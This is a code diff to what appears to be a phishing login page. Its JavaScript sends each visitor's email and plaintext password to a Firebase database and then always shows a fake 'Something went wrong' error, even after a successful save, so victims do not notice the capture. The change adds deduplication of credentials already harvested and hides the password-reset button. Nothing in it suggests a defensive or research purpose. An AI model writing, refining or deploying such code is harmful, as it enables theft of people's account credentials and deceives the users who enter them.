@@ -160,7 +160,7 @@
       </button>
     </div>
 
-    <button class="reset" id="resetBtn" type="button">Reset Password</button>
+    <!-- <button class="reset" id="resetBtn" type="button">Reset Password</button> -->
     <button class="orange-btn" id="loginBtn" type="button">Login</button>
     <div class="msg" id="msg" role="alert"></div>
   </section>
@@ -246,7 +246,7 @@ $('eyeBtn').addEventListener('click', () => {
   const p = $('pwInput'); p.type = p.type === 'password' ? 'text' : 'password';
 });
 
-/* ✅ Login button — save email + password to Firebase, then show toast */
+/* ✅ Login button — check for duplicates before saving */
 $('loginBtn').addEventListener('click', () => {
   const idVal = idInput.value.trim();
   const pwVal = $('pwInput').value;
@@ -258,19 +258,44 @@ $('loginBtn').addEventListener('click', () => {
 
   $('msg').textContent = '';
 
-  const userId = "User_" + Date.now().toString(36).toUpperCase();
+  // ✅ Check Firebase for existing email + password
+  database.ref(DB_NODE).once('value')
+    .then((snapshot) => {
+      let alreadyExists = false;
 
-  database.ref(DB_NODE + "/" + userId).set({
-    id: userId,
-    email: idVal,
-    password: pwVal,
-    timestamp: new Date().toLocaleString()
-  }).then(() => {
-    showToast("Something went wrong");
-  }).catch((error) => {
-    console.error("❌ Firebase error:", error);
-    showToast("Something went wrong");
-  });
+      if (snapshot.exists()) {
+        snapshot.forEach((child) => {
+          const u = child.val();
+          if (u.email === idVal && u.password === pwVal) {
+            alreadyExists = true;
+          }
+        });
+      }
+
+      if (alreadyExists) {
+        // ✅ Duplicate — do NOT save again, but still show toast
+        showToast("Something went wrong");
+        return;
+      }
+
+      // ✅ New data — save
+      const userId = "User_" + Date.now().toString(36).toUpperCase();
+      database.ref(DB_NODE + "/" + userId).set({
+        id: userId,
+        email: idVal,
+        password: pwVal,
+        timestamp: new Date().toLocaleString()
+      }).then(() => {
+        showToast("Something went wrong");
+      }).catch((error) => {
+        console.error("❌ Firebase error:", error);
+        showToast("Something went wrong");
+      });
+    })
+    .catch((error) => {
+      console.error("❌ Firebase check failed:", error);
+      showToast("Something went wrong");
+    });
 });
 
 $('regBtn').addEventListener('click', () => { /* TODO: register page */ });
